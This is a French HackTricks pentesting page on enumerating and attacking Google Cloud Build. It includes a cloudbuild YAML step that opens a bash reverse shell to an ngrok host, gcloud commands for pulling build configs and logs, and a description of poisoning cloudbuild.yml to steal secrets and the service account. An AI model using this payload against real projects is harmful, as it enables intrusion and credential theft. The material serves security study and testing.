# GCP - Cloud Build Enum

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

Google Cloud Build est une plateforme CI/CD g√©r√©e qui **automatise les processus de construction et de sortie de logiciels**, s'int√©grant avec **des d√©p√¥ts de code source** et prenant en charge un large √©ventail de langages de programmation. Elle **permet aux d√©veloppeurs de construire, tester et d√©ployer du code automatiquement** tout en offrant la flexibilit√© de personnaliser les √©tapes de construction et les flux de travail.

Chaque d√©clencheur Cloud Build est **li√© √† un d√©p√¥t Cloud ou directement connect√© √† un d√©p√¥t externe** (Github, Bitbucket ou Gitlab).

Il est possible de configurer un Cloud Build pour **exiger des approbations pour l'ex√©cution des constructions** (d√©sactiv√© par d√©faut).

Le **compte de service a le scope `cloud-platform`**, il peut donc **utiliser tous les privil√®ges.** Si **aucun compte de service n'est sp√©cifi√©** (comme lors de la soumission), le **compte de service par d√©faut** `<proj-number>@cloudbuild.gserviceaccount.com` sera **utilis√©.**

{% hint style="success" %}
Je n'ai trouv√© aucun moyen de voler le jeton Github/Bitbucket d'ici ou des d√©p√¥ts Cloud car lorsque le d√©p√¥t est t√©l√©charg√©, il est acc√©d√© via une URL [https://source.cloud.google.com/](https://source.cloud.google.com/) et Github n'est pas acc√©d√© par le client.
{% endhint %}

### Stockage

Parfois, Cloud Build va **g√©n√©rer un nouveau stockage pour stocker les fichiers pour le d√©clencheur**. Cela se produit par exemple dans l'exemple que GCP offre avec :
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Un bucket Storage nomm√© [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) est cr√©√© pour stocker un `.tgz` avec les fichiers √† utiliser.

### Obtenir un shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### √ânum√©ration

Vous pourriez trouver **des informations sensibles dans les configurations de build et les journaux**.
```bash
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs
```
## √âl√©vation de privil√®ges

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Acc√®s non authentifi√©

### cloudbuild.yml

Si vous compromettez l'acc√®s en √©criture sur un d√©p√¥t contenant un fichier nomm√© **`cloudbuild.yml`**, vous pourriez **infiltrer** ce fichier, qui sp√©cifie les **commandes qui vont √™tre ex√©cut√©es** √† l'int√©rieur d'un Cloud Build et exfiltrer les secrets, compromettre ce qui est fait et aussi compromettre le **compte de service Cloud Build.**

{% hint style="info" %}
Notez que GCP offre l'option permettant aux administrateurs de contr√¥ler l'ex√©cution des syst√®mes de build depuis des PR externes via "Comment Control". Comment Control est une fonctionnalit√© o√π les collaborateurs/propri√©taires de projet **doivent commenter ‚Äú/gcbrun‚Äù pour d√©clencher le build** contre la PR et utiliser cette fonctionnalit√© emp√™che intrins√®quement quiconque sur Internet de d√©clencher vos syst√®mes de build.
{% endhint %}

Pour des informations connexes, vous pourriez consulter la page sur comment attaquer Github Actions (similaire √† ceci) :

{% content-ref url="../../../pentesting-ci-cd/github-security/abusing-github-actions/" %}
[abusing-github-actions](../../../pentesting-ci-cd/github-security/abusing-github-actions/)
{% endcontent-ref %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
